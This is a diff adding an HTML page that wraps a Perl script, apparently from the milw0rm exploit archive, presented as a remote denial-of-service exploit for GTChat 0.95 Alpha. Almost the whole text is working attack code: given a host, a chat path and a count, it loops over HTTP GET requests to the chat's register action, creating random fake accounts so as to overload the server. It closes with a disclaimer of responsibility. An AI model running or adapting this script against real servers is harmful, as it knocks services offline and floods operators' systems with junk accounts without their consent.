@@ -1,0 +1,53 @@
+<html>
+<head>
+<title>GTChat <= 0.95 Alpha (adduser) Remote Denial of Service Exploit</title>
+<pre>
+# Use a high user # for best results. /str0ke
+
+#!/usr/bin/perl
+######################
+# codez0red by VTECin5th #
+# Feel free to modify/break this script #
+# Crappy code is more effective =] #
+# I accept no responsibility for misuse or abuse #
+######################
+# Usage: xxx.pl www.server.com /directory_to_chat/ #_of_users_to_create
+######################
+# Affected Software: GTChat .95
+# Unaffected Software: GTChat .93
+######################
+use IO::Socket;
+if (@ARGV &lt; 2){
+print &quot;Usage:\n xxx.pl www.server.com /Path_to_GTChat/ #_of_users_to_create\n&quot;;
+print &quot;Example:\n xxx.pl www.serfer.com /GTChat/cgi-bin/ 5&quot;;
+exit;
+}
+$dir = $ARGV[1];
+$numero = $ARGV[2];
+$host = $ARGV[0];
+$host =~ s/http\:\/\///gi;
+for ($i = 1; $i &lt;= $numero; $i++) {
+$rando = int(rand(234));
+$randy = int(rand(12));
+$whyThem = $randy . $rando . &quot;@&quot; . $randy . &quot;.com&quot;;
+$whyMe = &quot;SoSorry&quot; . $rando . $randy;
+$lol = &quot;$dir/chat.pl?action=register&amp;name=$whyMe&amp;password=$whyMe&amp;password2=$whyMe&amp;email=$whyThem&amp;privateemail=0&quot;;
+$ox=IO::Socket::INET-&gt;new(PeerAddr=&gt;$host,PeerPort=&gt;80,Proto=&gt;'tcp') || die &quot;Oh No! You broke teh server!&quot;;
+print $ox &quot;GET $lol HTTP/1.1\r\n&quot;;
+print $ox &quot;Accept: */*\r\n&quot;;
+print $ox &quot;Accept-Language: pt\r\n&quot;;
+print $ox &quot;Accept-Encoding: gzip, deflate\r\n&quot;;
+print $ox &quot;User-Agent: 1337 pwnz0r\r\n&quot;;
+print $ox &quot;Host: $host\r\n&quot;;
+print $ox &quot;Connection: Keep-Alive\r\n\r\n\r\n&quot;;
+print &quot;currently on: $whyMe \t ($i)\n&quot;;
+# Please note, this does not verify whether or not the user is actually being created.
+# I assume you know how to use this script.
+}
+print &quot;Finished creating $numero users&quot;;
+close($ox);
+
+# milw0rm.com [2005-08-23]
+</pre>
+</html>
+
